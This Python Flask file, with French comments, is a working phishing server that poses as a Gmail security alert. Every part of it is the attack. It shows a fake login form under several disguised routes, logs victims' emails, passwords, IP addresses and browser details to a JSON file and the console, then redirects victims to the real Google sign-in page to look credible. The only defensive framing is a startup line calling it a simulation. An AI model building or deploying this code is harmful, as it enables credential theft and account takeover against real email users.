from flask import Flask, request, render_template_string, redirect, url_for
import json
from datetime import datetime

app = Flask(__name__)

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Vérification de compte - Gmail</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
        .container { border: 1px solid #ddd; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; color: #4285f4; font-size: 24px; margin-bottom: 20px; }
        .gmail-logo { 
            background: linear-gradient(45deg, #ea4335, #fbbc05, #34a853, #4285f4);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            font-weight: bold;
        }
        input[type="email"], input[type="password"] { 
            width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; 
            border-radius: 4px; box-sizing: border-box; font-size: 14px;
        }
        input:focus { border-color: #4285f4; outline: none; }
        .btn { 
            background: #4285f4; color: white; padding: 12px 20px; 
            border: none; border-radius: 4px; cursor: pointer; width: 100%;
            font-size: 14px; font-weight: 500;
        }
        .btn:hover { background: #3367d6; }
        .warning { color: #d93025; font-size: 14px; margin-bottom: 20px; text-align: center; }
        .security-notice { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 15px 0; border-radius: 4px; }
        .url-bar { display: none; } /* Cache la barre d'adresse si possible */
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="gmail-logo">Gmail</span> 📧
        </div>
        <div class="security-notice">
            <strong>🔒 Alerte Sécurité</strong><br>
            Connexion suspecte détectée
        </div>
        <div class="warning">⚠️ Vérification immédiate requise</div>
        <form method="POST">
            <input type="email" name="email" placeholder="nom@gmail.com" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" class="btn">Sécuriser mon compte</button>
        </form>
        <p style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;">
            Cette vérification est requise pour maintenir la sécurité de votre compte.
        </p>
    </div>
</body>
</html>
'''

SUCCESS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Compte sécurisé - Gmail</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
        .success { color: #0f7c0f; }
        .container { border: 1px solid #ddd; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    </style>
    <script>
        // Rediriger vers Gmail après quelques secondes pour plus de crédibilité
        setTimeout(function() {
            window.location.href = 'https://accounts.google.com';
        }, 3000);
    </script>
</head>
<body>
    <div class="container">
        <div class="success">
            <h2>✅ Compte sécurisé</h2>
            <p>Votre compte a été vérifié et sécurisé avec succès.</p>
            <p>Redirection vers Gmail...</p>
        </div>
    </div>
</body>
</html>
'''

# Routes avec noms masqués
@app.route('/gmail-verify', methods=['GET', 'POST'])
@app.route('/account-security', methods=['GET', 'POST'])
@app.route('/secure-login', methods=['GET', 'POST'])
@app.route('/sendinfo', methods=['GET', 'POST'])
def sendinfo():
    if request.method == 'GET':
        return render_template_string(LOGIN_TEMPLATE)
    
    elif request.method == 'POST':
        # Capturer les informations soumises
        email = request.form.get('email')
        password = request.form.get('password')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Informations supplémentaires pour l'analyse
        referer = request.headers.get('Referer', 'Direct')
        
        captured_data = {
            'Date de Hacking': timestamp,
            'Email': email,
            'Mot de Passe': password,
            'Adresse IP': ip_address,
            'Appareil-Navigateur': user_agent,
            'Source': referer
        }
        
        with open('captured_credentials.json', 'a', encoding='utf-8') as f:
            json.dump(captured_data, f, ensure_ascii=False, indent=2)
            f.write('\n')
        
        print(f"[{timestamp}] 🎯 INFORMATIONS CAPTURÉES:")
        print(f"  📧 Email: {email}")
        print(f"  🔑 Password: {password}")
        print(f"  🌐 IP: {ip_address}")
        print(f"  💻 User-Agent: {user_agent}")
        print(f"  🔗 Referer: {referer}")
        print("="*60)
        
        return render_template_string(SUCCESS_TEMPLATE)

# Route de redirection depuis gmail-security
@app.route('/security-check')
def security_redirect():
    return redirect(url_for('sendinfo'))

# Route principale
@app.route('/')
def index():
    return redirect(url_for('sendinfo'))

# Route pour simuler une page Gmail
@app.route('/gmail')
def fake_gmail():
    return '<h1>Gmail</h1><p>Chargement...</p><script>window.location.href="/sendinfo";</script>'

if __name__ == '__main__':
    print("🚀 Serveur de simulation démarré")
    print("📍 URLs disponibles:")
    print("   • http://192.168.1.140:5000/gmail-verify")
    print("   • http://192.168.1.140:5000/account-security") 
    print("   • http://192.168.1.140:5000/secure-login")
    print("   • http://192.168.1.140:5000/sendinfo")
    print("📝 Données capturées → 'captured_credentials.json'")
    print("-"*50)
    app.run(host='0.0.0.0', port=5000, debug=True)